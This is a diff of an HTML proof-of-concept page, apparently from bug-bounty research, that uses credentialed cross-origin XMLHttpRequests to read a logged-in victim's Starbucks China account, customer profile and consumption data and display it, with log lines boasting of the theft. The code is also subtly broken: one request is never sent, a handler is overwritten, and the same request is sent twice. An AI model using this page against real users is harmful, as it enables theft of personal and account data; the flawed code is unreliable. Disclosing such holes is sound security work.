@@ -4,21 +4,57 @@
 <meta name="referrer" content="never">
 </head>
 <title>steal the informations</title>
-<iframe src="https://profile.starbucks.com.cn/api/account/detail"></iframe>
+<div text="steal account's information">
+<textarea id="account"></textarea>
+</div>
+<div text="steal customer's personal informaiton">
+<textarea id="customer"></textarea>
+</div>
+<div text="steal customer's consumption">
+<textarea id="consumption"></textarea>
+</div>
 <script>
      var xmlhttp = new XMLHttpRequest()
+     var xmlhttp1 = new XMLHttpRequest()
+     var xmlhttp2 = new XMLHttpRequest()
      xmlhttp.onreadystatechange=function()
 	{
 		if (xmlhttp.readyState==4 && xmlhttp.status==200)
 		{
-			alert(xmlhttp.responseText);
-			console.log("success");
+			document.getElementById("account").innerHTML = xmlhttp.responseText;
+			console.log("steal account information successed");
 		}
 	}
     	
 	xmlhttp.open("GET","https://profile.starbucks.com.cn/api/account/detail",true);
 	xmlhttp.withCredentials = true;
 	xmlhttp.send();
+	
+	xmlhttp1.onreadystatechange=function()
+	{
+		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
+		{
+			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
+			console.log("steal customer's profile successed");
+		}
+	}
+    	
+	xmlhttp2.open("GET","https://profile.starbucks.com.cn/api/Customers/detail",true);
+	xmlhttp2.withCredentials = true;
+	xmlhttp2.send();
+	
+	xmlhttp1.onreadystatechange=function()
+	{
+		if (xmlhttp2.readyState==4 && xmlhttp2.status==200)
+		{
+			document.getElementById("consumption").innerHTML = xmlhttp2.responseText;
+			console.log("steal customer's consumption successed");
+		}
+	}
+    	
+	xmlhttp2.open("GET","https://profile.starbucks.com.cn/api/Customers/detail",true);
+	xmlhttp2.withCredentials = true;
+	xmlhttp2.send();
 </script>
-<a href="https://www.baidu.com">test for referer</a>
+<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
 </html>
